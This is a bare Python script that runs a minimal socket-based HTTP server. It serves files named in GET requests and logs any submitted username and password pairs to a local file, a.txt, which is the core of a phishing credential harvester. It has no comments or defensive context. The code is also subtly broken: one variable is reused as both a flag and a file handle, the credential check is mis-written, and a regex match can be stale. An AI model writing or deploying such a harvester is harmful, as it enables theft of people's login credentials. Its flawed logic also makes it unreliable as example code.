import socket
import sys
import os
import re
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host=""
port=int(sys.argv[1])
s.bind((host,port))
s.listen(1)
f=0

while True:
	(c,addr)=s.accept()
	msg=c.recv(1024)
	if f==0:
		r=re.search(r'GET\s/([\w\.]+)',msg)
		c.send('HTTP/1.0 200 OK \r\n')
		c.send('Content-Type: text/html\r\n\r\n')
	c.send(open(r.group(1)).read())
	if "user" and "pass" in msg:
		b=re.search(r'user=(\w+)&pass=(\w+)\s',msg)
		f=open('a.txt','a')
		f.write("username=%s password=%s\n"%(b.group(1),b.group(2)))
		f.close()
	

